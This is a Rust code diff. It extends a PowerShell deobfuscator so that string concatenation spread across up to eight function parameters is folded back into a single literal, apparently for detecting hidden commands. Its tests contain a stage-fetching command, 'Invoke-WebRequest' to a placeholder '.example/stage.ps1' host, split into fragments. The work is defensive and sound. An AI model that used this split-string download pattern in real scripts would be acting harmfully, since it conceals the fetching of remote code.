@@ -1073,10 +1073,14 @@ static PS_LITERAL_STRING_CASE_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
 #[allow(clippy::expect_used)]
 static PS_LITERAL_CONCAT_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
-        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\+\s*(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?"#,
+        r#"(?is)(?:\breturn\s+)?((?:\(\s*)?\$[A-Za-z_][A-Za-z0-9_]*\s*(?:\)\s*)?(?:\+\s*(?:\(\s*)?\$[A-Za-z_][A-Za-z0-9_]*\s*(?:\)\s*)?){1,7})"#,
     )
     .expect("ps literal concat extractor body regex")
 });
+
+#[allow(clippy::expect_used)]
+static PS_LITERAL_CONCAT_VAR_RE: Lazy<Regex> =
+    Lazy::new(|| Regex::new(r#"\$([A-Za-z_][A-Za-z0-9_]*)"#).expect("ps literal concat var regex"));
 
 #[allow(clippy::expect_used)]
 static PS_LITERAL_INDEX_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
@@ -3850,31 +3854,38 @@ fn expand_literal_concat_extractor_calls(text: &str) -> String {
         let Some(caps) = PS_LITERAL_CONCAT_EXTRACTOR_BODY_RE.captures(&body) else {
             continue;
         };
-        let Some(left_var) = caps.get(1).map(|m| m.as_str()) else {
+        let Some(expr) = caps.get(1) else {
             continue;
         };
-        let Some(right_var) = caps.get(2).map(|m| m.as_str()) else {
+        let after_expr = skip_ascii_ws(body.as_bytes(), expr.end());
+        if body.as_bytes().get(after_expr) == Some(&b'+') {
             continue;
-        };
+        }
 
         let param_index = parse_ps_function_param_indices(&params);
-        let Some(left_idx) = param_index.get(&left_var.to_ascii_lowercase()).copied() else {
+        let Some(parts) = ps_literal_concat_extractor_parts(expr.as_str(), &param_index) else {
             continue;
         };
-        let Some(right_idx) = param_index.get(&right_var.to_ascii_lowercase()).copied() else {
-            continue;
-        };
-
         let binding = PsConcatExtractorParamBinding {
-            left_idx,
-            left_name: left_var,
-            right_idx,
-            right_name: right_var,
+            parts,
             arg_count: param_index.len(),
         };
         out = inline_ps_literal_concat_calls(&out, &name, binding);
     }
     out
+}
+
+fn ps_literal_concat_extractor_parts<'a>(
+    expr: &'a str,
+    param_index: &std::collections::HashMap<String, usize>,
+) -> Option<Vec<PsConcatExtractorPart<'a>>> {
+    let mut parts = Vec::new();
+    for caps in PS_LITERAL_CONCAT_VAR_RE.captures_iter(expr) {
+        let name = caps.get(1)?.as_str();
+        let idx = param_index.get(&name.to_ascii_lowercase()).copied()?;
+        parts.push(PsConcatExtractorPart { idx, name });
+    }
+    (parts.len() >= 2 && parts.len() <= 8).then_some(parts)
 }
 
 fn expand_literal_index_extractor_calls(text: &str) -> String {
@@ -6715,11 +6726,13 @@ impl PsStringCaseKind {
 }
 
 #[derive(Clone, Copy)]
+struct PsConcatExtractorPart<'a> {
+    idx: usize,
+    name: &'a str,
+}
+
 struct PsConcatExtractorParamBinding<'a> {
-    left_idx: usize,
-    left_name: &'a str,
-    right_idx: usize,
-    right_name: &'a str,
+    parts: Vec<PsConcatExtractorPart<'a>>,
     arg_count: usize,
 }
 
@@ -6753,15 +6766,9 @@ fn inline_ps_literal_concat_calls(
                 pos = skip_ascii_ws(bytes, pos + 1);
             }
             let parsed = if bytes.get(pos) == Some(&b'-') {
-                inline_ps_named_literal_concat_call(
-                    text,
-                    pos,
-                    parenthesized,
-                    binding.left_name,
-                    binding.right_name,
-                )
+                inline_ps_named_literal_concat_call(text, pos, parenthesized, &binding.parts)
             } else {
-                parse_ps_positional_literal_concat_args(text, pos, parenthesized, binding)
+                parse_ps_positional_literal_concat_args(text, pos, parenthesized, &binding)
                     .map(|(call_end, value)| (call_end, format!("'{}'", value.replace('\'', "''"))))
             };
             let Some((call_end, replacement)) = parsed else {
@@ -6785,27 +6792,27 @@ fn parse_ps_positional_literal_concat_args(
     text: &str,
     mut pos: usize,
     parenthesized: bool,
-    binding: PsConcatExtractorParamBinding<'_>,
+    binding: &PsConcatExtractorParamBinding<'_>,
 ) -> Option<(usize, String)> {
     if binding.arg_count == 0
         || binding.arg_count > 8
-        || binding.left_idx >= binding.arg_count
-        || binding.right_idx >= binding.arg_count
+        || binding
+            .parts
+            .iter()
+            .any(|part| part.idx >= binding.arg_count)
     {
         return None;
     }
 
     let bytes = text.as_bytes();
-    let mut left = None;
-    let mut right = None;
+    let mut values = vec![None; binding.parts.len()];
     let mut arg_end = pos;
     for idx in 0..binding.arg_count {
         let (next_end, arg) = parse_ps_literal_or_usize_arg(text, pos)?;
-        if idx == binding.left_idx {
-            left = Some(arg.as_str()?.to_string());
-        }
-        if idx == binding.right_idx {
-            right = Some(arg.as_str()?.to_string());
+        for (part_idx, part) in binding.parts.iter().enumerate() {
+            if idx == part.idx {
+                values[part_idx] = Some(arg.as_str()?.to_string());
+            }
         }
         arg_end = next_end;
         pos = next_end;
@@ -6822,8 +6829,10 @@ fn parse_ps_positional_literal_concat_args(
         arg_end = after + 1;
     }
 
-    let mut value = left?;
-    value.push_str(&right?);
+    let mut value = String::new();
+    for part in values {
+        value.push_str(&part?);
+    }
     (value.len() <= 8192).then_some((arg_end, value))
 }
 
@@ -6831,23 +6840,19 @@ fn inline_ps_named_literal_concat_call(
     text: &str,
     pos: usize,
     parenthesized: bool,
-    left_name: &str,
-    right_name: &str,
+    parts: &[PsConcatExtractorPart<'_>],
 ) -> Option<(usize, String)> {
     let (call_end, args) =
-        parse_ps_named_static_literal_or_usize_args(text, pos, parenthesized, 4)?;
-    let left = args
-        .iter()
-        .find(|(name, _)| name.eq_ignore_ascii_case(left_name))?
-        .1
-        .as_literal()?;
-    let right = args
-        .iter()
-        .find(|(name, _)| name.eq_ignore_ascii_case(right_name))?
-        .1
-        .as_literal()?;
-    let mut value = left.to_string();
-    value.push_str(right);
+        parse_ps_named_static_literal_or_usize_args(text, pos, parenthesized, 8)?;
+    let mut value = String::new();
+    for part in parts {
+        let chunk = args
+            .iter()
+            .find(|(name, _)| name.eq_ignore_ascii_case(part.name))?
+            .1
+            .as_literal()?;
+        value.push_str(chunk);
+    }
     if value.len() > 8192 {
         return None;
     }
@@ -10149,6 +10154,23 @@ Join-Text -right '.example/stage.ps1' -left 'Invoke-WebRequest -Uri https://ps-c
                 "'Invoke-WebRequest -Uri https://ps-concat-named-extractor.example/stage.ps1'"
             ),
             "named-argument concat extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_multi_concat_extractor_named_args_call_is_rewritten() {
+        let text = r#"function Join-Text($left,$middle,$right) {
+  return $left + $middle + $right
+}
+Join-Text -right '.example/stage.ps1' -left 'Invoke-WebRequest -Uri https://ps-multi-concat-named' -middle '-extractor'"#;
+
+        let out = expand_literal_concat_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-multi-concat-named-extractor.example/stage.ps1'"
+            ),
+            "named-argument multi-concat extractor call was not rewritten:\n{out}"
         );
     }
 
